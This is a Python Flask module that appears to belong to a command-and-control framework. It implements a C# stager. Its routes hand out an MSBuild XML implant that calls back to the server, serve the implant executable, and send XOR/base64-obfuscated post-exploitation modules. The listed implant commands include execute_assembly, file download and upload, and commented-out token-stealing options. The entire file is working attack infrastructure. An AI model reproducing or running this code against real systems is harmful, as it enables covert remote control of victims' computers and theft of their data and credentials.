import os

from connect.server.models import db, ImplantModel
from connect.server.endpoint import websocket
from connect.generate import digit_identifier, string_identifier
from connect.convert import xor_base64
from flask import Blueprint, render_template, request, url_for, send_file, jsonify

csharp = Blueprint('csharp', __name__, template_folder='resources')
endpoint = digit_identifier()
load_uri_endpoint = digit_identifier()
artifact = string_identifier()
endpoints = f'~server_uri~{endpoint}.xml\n' \
            f'~server_uri~{endpoint}.exe'
available_modules = {
    "ps":"/connect/server/stagers/csharp/resources/modules/Processes.exe"
#    "make_token"
#    "rev2self"
#    "steal_token"
#    "get_token"
#    "cmd"
#    "ps"
}
commands = 'delay,whoami,hostname,os,pwd,cd,dir,execute_assembly,download,upload,integrity'
commands = commands + ',' + ','.join(available_modules.keys()) if available_modules.keys() else commands


@csharp.route(f'/{endpoint}.xml', methods=['GET'])
def generate_implant():
    """
    csharp Route
    The csharp route expects a get request and will return an implant to be executed on the target(s) machine. The
    implant will attempt to establish a command and control connection to the framework.
    """
    print(available_modules)
    implant = ImplantModel(commands=commands, available_modules=available_modules)
    db.session.add(implant)
    db.session.commit()
    websocket.emit('job_sent', 'CSharp implant sent.')

    # noinspection PyUnresolvedReferences
    return render_template('msbuild.xml', check_in_uri=f"{request.host_url}", key=implant.key, sleep=implant.sleep,
                           jitter=implant.jitter, endpoints=implant.endpoints, csharp_uri=f'{request.host_url}{url_for("csharp.csharp_uri")}', load_uri=f'{request.host_url}{load_uri_endpoint}')


@csharp.route(f'/{endpoint}.exe', methods=['GET'])
def csharp_uri():
    return send_file(f'{os.getcwd()}/connect/server/stagers/csharp/resources/connect.exe')


@csharp.route(f'/{load_uri_endpoint}', methods=['POST'])
def load_uri():
    json_data = request.get_json(force=True)
    method_name = json_data['method_name'] if json_data['method_name'] in available_modules.keys() else None
    if not method_name:
        return jsonify({"jsonrpc": "2.0", "name": "load_module", "arguments": ["Not Found"], "id": "0"})
    module = available_modules[method_name]
    with open(f'{os.getcwd()}{module}', 'rb') as fd:
        key, file = xor_base64(fd.read())
    return jsonify({"jsonrpc": "2.0", "name": "load_module", "arguments": [key, file], "id": "0"})

    